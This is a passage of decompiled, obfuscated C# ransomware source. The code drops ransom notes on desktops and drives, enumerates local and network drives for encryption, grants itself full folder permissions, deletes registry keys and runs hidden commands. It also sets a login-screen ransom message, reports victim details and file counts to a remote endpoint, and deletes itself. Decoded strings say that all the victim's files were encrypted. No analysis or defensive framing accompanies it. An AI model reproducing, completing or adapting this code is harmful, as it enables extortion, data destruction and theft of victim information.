					streamWriter.WriteLine(AVKODeXgMr.RdWUiLAhRtYuk());
				}
			}
			else
			{
				string text11 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395149));
				if (!text11.Contains(GThDVKInjH) && !UpNccIaFzBadyA)
				{
					File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395149), getString_0(107389219) + GThDVKInjH);
				}
			}
		}
		catch
		{
		}
		int num = 0;
		foreach (string item in IDUZlSGaIfn)
		{
			num++;
			try
			{
				if (item == Environment.GetFolderPath(Environment.SpecialFolder.Desktop))
				{
					continue;
				}
			}
			catch
			{
			}
			try
			{
				if (!File.Exists(item + getString_0(107395149)))
				{
					File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395149), item + getString_0(107395149), overwrite: true);
				}
				else
				{
					string text12 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395149));
					if (!text12.Contains(GThDVKInjH) && !UpNccIaFzBadyA)
					{
						File.AppendAllText(item + getString_0(107395149), getString_0(107389219) + GThDVKInjH);
					}
				}
			}
			catch (Exception)
			{
			}
			if (!XeXEhFhfYVvh && num > 10)
			{
				break;
			}
		}
		if (lanIsMFtITLe == getString_0(107396811))
		{
			try
			{
				if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389190)))
				{
					using StreamWriter streamWriter2 = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389190));
					streamWriter2.WriteLine(OEjiexKEqeO(getString_0(107389157)));
					streamWriter2.WriteLine(getString_0(107396497));
					streamWriter2.WriteLine(OEjiexKEqeO(getString_0(107401705)));
					streamWriter2.WriteLine(GThDVKInjH + OEjiexKEqeO(getString_0(107401584)));
					if (gsXyoeFOorGZ == getString_0(107396345))
					{
						streamWriter2.WriteLine(getString_0(107396497));
						streamWriter2.WriteLine(OEjiexKEqeO(getString_0(107401603)) + OEjiexKEqeO(getString_0(107389809)) + Convert.ToString(JEkdiihxCoWf.Count) + OEjiexKEqeO(getString_0(107401584)));
					}
					if (OtvlrYHFRq)
					{
						streamWriter2.WriteLine(getString_0(107396497));
						streamWriter2.WriteLine(OEjiexKEqeO(getString_0(107389252)));
						streamWriter2.WriteLine(AVKODeXgMr.RdWUiLAhRtYuk());
					}
				}
				else
				{
					string text13 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395149));
					if (!text13.Contains(GThDVKInjH) && !UpNccIaFzBadyA)
					{
						File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389190), OEjiexKEqeO(getString_0(107401603)) + getString_0(107389219) + GThDVKInjH + OEjiexKEqeO(getString_0(107401584)));
					}
				}
			}
			catch
			{
			}
		}
		if (HohHoEgJewvBWz == getString_0(107396811))
		{
			try
			{
				if (gsXyoeFOorGZ == getString_0(107396345))
				{
					AVKODeXgMr.UpldEXWvoGTdlQa(getString_0(107401030), getString_0(107401025), getString_0(107400980), string.Concat(OEjiexKEqeO(getString_0(107396563)), new WebClient().DownloadString(OEjiexKEqeO(getString_0(107396538))), getString_0(107401003), OEjiexKEqeO(getString_0(107396524)), DateTime.Now, getString_0(107396497), OEjiexKEqeO(getString_0(107400998)), Convert.ToString(JEkdiihxCoWf.Count), getString_0(107396497), OEjiexKEqeO(getString_0(107396483)), GThDVKInjH));
				}
				else
				{
					AVKODeXgMr.UpldEXWvoGTdlQa(getString_0(107401030), getString_0(107401025), getString_0(107400980), string.Concat(OEjiexKEqeO(getString_0(107396563)), new WebClient().DownloadString(OEjiexKEqeO(getString_0(107396538))), getString_0(107401003), OEjiexKEqeO(getString_0(107396524)), DateTime.Now, getString_0(107396497), OEjiexKEqeO(getString_0(107400998)), Convert.ToString(JEkdiihxCoWf.Count), getString_0(107396497), OEjiexKEqeO(getString_0(107396483)), GThDVKInjH));
				}
			}
			catch
			{
			}
		}
		if (DdPuPlUptL == getString_0(107396811))
		{
			try
			{
				NCssbpdQUzGTd.BjnCzVzVmJLm(new Uri(getString_0(107400917)));
			}
			catch
			{
			}
		}
		if (lanIsMFtITLe == getString_0(107396345))
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395149)))
				{
					Process.Start(OEjiexKEqeO(getString_0(107400916)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107395149));
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389190)))
				{
					Process.Start(OEjiexKEqeO(getString_0(107400891)), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + getString_0(107389190));
				}
			}
			catch
			{
			}
		}
		if (TLvIKeJnVejcNG == getString_0(107396811))
		{
			if (cfLMhLbiCC == getString_0(107396811) && !string.IsNullOrEmpty(dPIYrIPkEeCv) && !string.IsNullOrEmpty(LfrLWEkFCBwUa))
			{
				zNAgwrqdebjO(dPIYrIPkEeCv, LfrLWEkFCBwUa);
			}
			else
			{
				zNAgwrqdebjO(getString_0(107400906), getString_0(107400877));
			}
		}
		if (EMMMLIMedETY != getString_0(107401155))
		{
			BmLVFzynKDlEKr(EMMMLIMedETY);
		}
		if (!string.IsNullOrEmpty(YrUNJYkfZORc))
		{
			try
			{
				File.Delete(YrUNJYkfZORc);
			}
			catch
			{
			}
		}
		try
		{
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397029))))
			{
				File.Delete(Path.Combine(Directory.GetCurrentDirectory(), getString_0(107397029)));
			}
		}
		catch (Exception ex16)
		{
			try
			{
				File.AppendAllText(bDDJFCkjBbYQ, getString_0(107401106) + ex16.Message);
			}
			catch (Exception)
			{
			}
		}
		if (SWaMdrdKGgzowGl)
		{
			try
			{
				File.AppendAllText(bDDJFCkjBbYQ, getString_0(107401093));
			}
			catch (Exception)
			{
			}
		}
		if (mkgreXsNDfWo == getString_0(107400536))
		{
			IPHnSCfxuwkpRn();
		}
	}

	public static void hLkCZwvYlBIGN()
	{
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(OEjiexKEqeO(getString_0(107400559)), OEjiexKEqeO(getString_0(107400906)), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int fvSzlSraUXFgd(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> ZKXIUeGXwxjL(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.Contains(getString_0(107400373)) && !text.Contains(getString_0(107400348)) && !text.Contains(getString_0(107400315)) && !text.ToLower().Contains(getString_0(107400330)) && !text.ToLower().Contains(getString_0(107400797)) && !text.Contains(getString_0(107400804)) && !text.Contains(getString_0(107400783)) && !text.ToLower().Contains(getString_0(107400770)) && !text.ToLower().Contains(getString_0(107400725)) && !text.ToLower().Contains(getString_0(107400688)) && !text.ToLower().Contains(getString_0(107400711)) && !text.ToLower().Contains(getString_0(107400662)) && !text.ToLower().Contains(getString_0(107400681)) && !text.ToLower().Contains(getString_0(107400636)) && !text.ToLower().Contains(getString_0(107400647)))
				{
					array = Directory.GetFiles(text);
					goto IL_01f1;
				}
			}
			catch
			{
			}
			continue;
			IL_01f1:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (!fileInfo.FullName.Contains(getString_0(107400622)) && !fileInfo.FullName.Contains(getString_0(107400573)) && !fileInfo.FullName.Contains(getString_0(107400588)) && !fileInfo.FullName.Contains(getString_0(107400027)) && !fileInfo.FullName.Contains(getString_0(107400042)) && !fileInfo.FullName.Contains(getString_0(107399993)) && !fileInfo.FullName.Contains(getString_0(107400008)) && !fileInfo.FullName.Contains(getString_0(107399959)) && !fileInfo.FullName.Contains(getString_0(107399978)) && !fileInfo.FullName.Contains(getString_0(107399925)) && !fileInfo.FullName.ToLower().Contains(getString_0(107399944)) && !fileInfo.FullName.ToLower().Contains(getString_0(107399899)) && !fileInfo.FullName.ToLower().Contains(getString_0(107399914)) && !fileInfo.FullName.ToLower().Contains(getString_0(107399865)) && !fileInfo.FullName.Contains(OEjiexKEqeO(getString_0(107399880))) && !fileInfo.FullName.Contains(getString_0(107399855)) && !fileInfo.FullName.Contains(getString_0(107397029)) && !fileInfo.FullName.Contains(getString_0(107399842)) && !fileInfo.FullName.EndsWith(getString_0(107395159)) && !fileInfo.FullName.EndsWith(getString_0(107399817)) && !fileInfo.FullName.EndsWith(getString_0(107399812)) && !fileInfo.FullName.EndsWith(getString_0(107400287)) && !fileInfo.FullName.EndsWith(getString_0(107400282)) && !fileInfo.FullName.Contains(getString_0(107400277)) && !fileInfo.FullName.Contains(ZLERFztvScvXGTf) && !fileInfo.FullName.Contains(bDDJFCkjBbYQ) && !fileInfo.FullName.Contains(IKRtRLOSqagD))
					{
						if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(FoLsSeMcEVuV) * 1024.0 * 1024.0 && QotWPeyjvzjx == getString_0(107396811))
						{
							list.Add(fileInfo.FullName);
							OuhJaGUSkgjWlKv(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && QotWPeyjvzjx == getString_0(107396345))
						{
							list.Add(fileInfo.FullName);
							OuhJaGUSkgjWlKv(list, string_1, string_2, string_3, string_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void ImKvZHKFlbCzy()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(getString_0(107400292));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!eaZULefnOUcJVI.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400239), getString_0(107397181)).Replace(getString_0(107400234), getString_0(107400239))
					.Replace(getString_0(107400225), getString_0(107400917))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					eaZULefnOUcJVI.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(getString_0(107400239), getString_0(107397181)).Replace(getString_0(107400234), getString_0(107400239))
						.Replace(getString_0(107400225), getString_0(107400917))
						.Split(new char[1] { '(' })[0].Trim().Replace(getString_0(107400188), getString_0(107400917)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string nYTitVLsoNLJb(string AugXZGbJUklS = "", string iglRodskvLhn = "")
	{
		string result = getString_0(107400917);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = AugXZGbJUklS,
				Arguments = iglRodskvLhn,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void ayEtBVKeJdAGOlKU(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = getString_0(107400179),
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string XOtQxzFPxuTjra(string string_0)
	{
		char[] array = string_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string OEjiexKEqeO(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void OIiwigZkIwU(string ltPgqyoNcORKG = "", string kHMzRYAdgtUzGOD = "SW5mb3JtYXRpb24uLi4=", string LpdzNkagRlOCOp = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		ltPgqyoNcORKG = XOtQxzFPxuTjra(getString_0(107400194));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(OEjiexKEqeO(ltPgqyoNcORKG), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(OEjiexKEqeO(getString_0(107400097)), OEjiexKEqeO(kHMzRYAdgtUzGOD));
				registryKey.SetValue(OEjiexKEqeO(getString_0(107400064)), OEjiexKEqeO(LpdzNkagRlOCOp));
				registryKey.Close();
			}
		}
		catch
		{
		}
		try
		{
			ltPgqyoNcORKG = XOtQxzFPxuTjra(getString_0(107399523));
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(OEjiexKEqeO(ltPgqyoNcORKG), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(OEjiexKEqeO(getString_0(107399386)), OEjiexKEqeO(kHMzRYAdgtUzGOD));
				registryKey.SetValue(OEjiexKEqeO(getString_0(107399353)), OEjiexKEqeO(LpdzNkagRlOCOp));
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void CRcSCrOxgKM()
	{
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				if (cfLMhLbiCC == getString_0(107396811) && !string.IsNullOrEmpty(dPIYrIPkEeCv) && !string.IsNullOrEmpty(LfrLWEkFCBwUa))
				{
					OIiwigZkIwU(getString_0(107400917), dPIYrIPkEeCv, LfrLWEkFCBwUa);
				}
				else
				{
					OIiwigZkIwU(getString_0(107400917), getString_0(107400906), getString_0(107400877));
				}
			}
		}
		catch
		{
		}
	}

	public static void zNAgwrqdebjO(string WxkwmhTBgStQ = "SW5mb3JtYXRpb24uLi4=", string GEBaYaxndTlWw = "QWxsIHlvdXIgZmlsZXMgd2VyZSBlbmNyeXB0ZWQsIGlmIHlvdSB3YW50IHRvIGdldCB0aGVtIGFsbCBiYWNrLCBwbGVhc2UgY2FyZWZ1bGx5IHJlYWQgdGhlIHRleHQgbm90ZSBsb2NhdGVkIGluIHlvdXIgZGVza3RvcC4uLg==")
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		NotifyIcon val = new NotifyIcon();
		val.set_Icon(SystemIcons.get_Warning());
		val.set_Visible(true);
		val.set_BalloonTipIcon((ToolTipIcon)2);
		val.set_BalloonTipTitle(OEjiexKEqeO(WxkwmhTBgStQ));
		val.set_BalloonTipText(OEjiexKEqeO(GEBaYaxndTlWw));
		val.ShowBalloonTip(30000);
	}

	public static void BmLVFzynKDlEKr(string string_0)
	{
		string text = WindowsIdentity.GetCurrent().Name.Split(new char[1] { '\\' })[1].ToString();
		nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107399324)), getString_0(107399339) + text + getString_0(107399330) + string_0);
	}

	public static void LaKkDEmcTxZa(string string_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = OEjiexKEqeO(getString_0(107399293));
		processStartInfo.Arguments = getString_0(107399296) + string_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool uspKwdLgume(string string_0, string string_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(string_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(string_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static void kfmVmRBkmLyJ()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string string_ = XOtQxzFPxuTjra(getString_0(107399771));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(OEjiexKEqeO(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(OEjiexKEqeO(getString_0(107399633)));
					registryKey.DeleteSubKey(OEjiexKEqeO(getString_0(107399608)));
					registryKey.DeleteSubKey(OEjiexKEqeO(getString_0(107399623)));
					registryKey.DeleteSubKey(OEjiexKEqeO(getString_0(107399598)));
					registryKey.DeleteSubKey(OEjiexKEqeO(getString_0(107399293)));
					registryKey.DeleteSubKey(OEjiexKEqeO(getString_0(107399541)));
					registryKey.DeleteSubKey(OEjiexKEqeO(getString_0(107399324)));
					registryKey.Close();
				}
				string_ = XOtQxzFPxuTjra(getString_0(107399000));
				registryKey = Registry.LocalMachine.OpenSubKey(OEjiexKEqeO(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(OEjiexKEqeO(getString_0(107398903)));
					registryKey.Close();
				}
				string_ = XOtQxzFPxuTjra(getString_0(107398918));
				registryKey = Registry.LocalMachine.OpenSubKey(OEjiexKEqeO(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(OEjiexKEqeO(getString_0(107398903)));
					registryKey.Close();
				}
				string_ = XOtQxzFPxuTjra(getString_0(107398918));
				registryKey = Registry.CurrentUser.OpenSubKey(OEjiexKEqeO(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(OEjiexKEqeO(getString_0(107398903)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107398869)), OEjiexKEqeO(getString_0(107398884)));
			nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107398803)), OEjiexKEqeO(XOtQxzFPxuTjra(getString_0(107398826))));
			nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107398803)), OEjiexKEqeO(getString_0(107399160)));
			nYTitVLsoNLJb(OEjiexKEqeO(getString_0(107399099)), OEjiexKEqeO(getString_0(107399114)));
		}
		catch
		{
		}
	}

	public static void KFuNWiOQTHKqWciPe(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(OEjiexKEqeO(getString_0(107399041)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void EMfHimKXkHfuX()
	{
		string string_ = XOtQxzFPxuTjra(getString_0(107398504));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(OEjiexKEqeO(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(OEjiexKEqeO(getString_0(107398391)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string LypZRSBkkfGsA(string ZngGnYDsnFsPT, int wapCcbbLFJfNDJ = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(wapCcbbLFJfNDJ);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(ZngGnYDsnFsPT, 1, intPtr, ref wapCcbbLFJfNDJ) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void IPHnSCfxuwkpRn()
	{
		nYTitVLsoNLJb(getString_0(107396268), OEjiexKEqeO(getString_0(107398358)));
		string text = OEjiexKEqeO(getString_0(107398676));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107400225) + text + getString_0(107400225) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396268);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void rkkEfvYkADSUN(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(bDDJFCkjBbYQ, getString_0(107398611) + string_0 + getString_0(107398634) + ex.Message + getString_0(107396497));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string rLhkxjtAGaYQ()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107400917);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107398513);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107398568))) ? getString_0(107398518) : getString_0(107398527));
				break;
			case 0:
				text = getString_0(107398573);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107398540);
				break;
			case 4:
				text = getString_0(107397983);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107397997) : getString_0(107397974));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107397941) : getString_0(107397946)) : getString_0(107397951)) : getString_0(107397992));
				break;
			case 10:
				text = getString_0(107397936);
				break;
			}
		}
		if (text != getString_0(107400917))
		{
			text = getString_0(107397963) + text;
			if (oSVersion.ServicePack != getString_0(107400917))
			{
				text = text + getString_0(107399330) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string VpswVOavVAxq(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395149);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(OEjiexKEqeO(getString_0(107395116)));
				streamWriter.WriteLine(getString_0(107396497));
				streamWriter.WriteLine(OEjiexKEqeO(getString_0(107389842)));
				streamWriter.WriteLine(string_0);
				if (OtvlrYHFRq)
				{
					streamWriter.WriteLine(getString_0(107396497));
					streamWriter.WriteLine(OEjiexKEqeO(getString_0(107389252)));
					streamWriter.WriteLine(AVKODeXgMr.RdWUiLAhRtYuk());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !UpNccIaFzBadyA)
				{
					File.AppendAllText(text, getString_0(107389219) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (SWaMdrdKGgzowGl)
			{
				try
				{
					File.AppendAllText(bDDJFCkjBbYQ, getString_0(107397918) + ex.Message + getString_0(107396497));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void xAIWeJOsoFFQ(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		EEavbmEMQoKeJ.UOEEhIEilusU CS_0024_003C_003E8__locals0 = new EEavbmEMQoKeJ();
		CS_0024_003C_003E8__locals0.CqITlEjkWXnTK = string_1;
		CS_0024_003C_003E8__locals0.aFwtZhkyhonxJx = string_2;
		CS_0024_003C_003E8__locals0.XXWrItZGjdyeN = string_3;
		CS_0024_003C_003E8__locals0.tNRwfpjZiNCOM = string_4;
		if (uBpdQdBJjeZ && !rLhkxjtAGaYQ().Contains(getString_0(107397997)) && !rLhkxjtAGaYQ().Contains(getString_0(107397893)))
		{
			orhCskyPNDQtQO.CUUztVrLyv();
		}
		nQCMwcWKyQk = Convert.FromBase64String(CS_0024_003C_003E8__locals0.XXWrItZGjdyeN);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107397848))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = LypZRSBkkfGsA(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !eaZULefnOUcJVI.Contains(text))
							{
								eaZULefnOUcJVI.Add(text);
							}
							else if (!eaZULefnOUcJVI.Contains(array[i].Name))
							{
								eaZULefnOUcJVI.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!eaZULefnOUcJVI.Contains(array[i].Name))
							{
								eaZULefnOUcJVI.Add(array[i].Name);
							}
						}
					}
					else if (!eaZULefnOUcJVI.Contains(array[i].Name))
					{
						eaZULefnOUcJVI.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!eaZULefnOUcJVI.Contains(string_0[j]))
				{
					eaZULefnOUcJVI.Add(string_0[j]);
				}
			}
		}
		if (eaZULefnOUcJVI.Contains(OEjiexKEqeO(getString_0(107397871))) && ThomocmQwcHBb == getString_0(107396811))
		{
			eaZULefnOUcJVI.Remove(OEjiexKEqeO(getString_0(107397871)));
		}
		Parallel.ForEach(eaZULefnOUcJVI, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new EEavbmEMQoKeJ.UOEEhIEilusU();
			CS_0024_003C_003E8__locals0.CmugrfMrRPzmz = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY = string_0;
			if (bTMUTlJGkGOO && !rLhkxjtAGaYQ().Contains(EEavbmEMQoKeJ.getString_0(107398006)) && !rLhkxjtAGaYQ().Contains(EEavbmEMQoKeJ.getString_0(107397902)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						uspKwdLgume(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (gsXyoeFOorGZ == EEavbmEMQoKeJ.getString_0(107396820))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					KPExWynENnAdrRu(CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY, CS_0024_003C_003E8__locals0.CmugrfMrRPzmz.CqITlEjkWXnTK, CS_0024_003C_003E8__locals0.CmugrfMrRPzmz.tNRwfpjZiNCOM, CS_0024_003C_003E8__locals0.CmugrfMrRPzmz.aFwtZhkyhonxJx, CS_0024_003C_003E8__locals0.CmugrfMrRPzmz.XXWrItZGjdyeN);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				KPExWynENnAdrRu(CS_0024_003C_003E8__locals0.QHcameMEDyksqkWY, CS_0024_003C_003E8__locals0.CqITlEjkWXnTK, CS_0024_003C_003E8__locals0.tNRwfpjZiNCOM, CS_0024_003C_003E8__locals0.aFwtZhkyhonxJx, CS_0024_003C_003E8__locals0.XXWrItZGjdyeN);
			}
		});
	}

	public static void KPExWynENnAdrRu(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107400917));
		List<string> list3 = list2;
		if (wWsTKhWTnA == getString_0(107396345))
		{
			list = ZKXIUeGXwxjL(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = WfwjzXqMlnLKXBb.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039b;
					}
				}
				if ((sWPChGvxft == getString_0(107396345) && !item.EndsWith(text)) || JEkdiihxCoWf.Contains(item))
				{
					continue;
				}
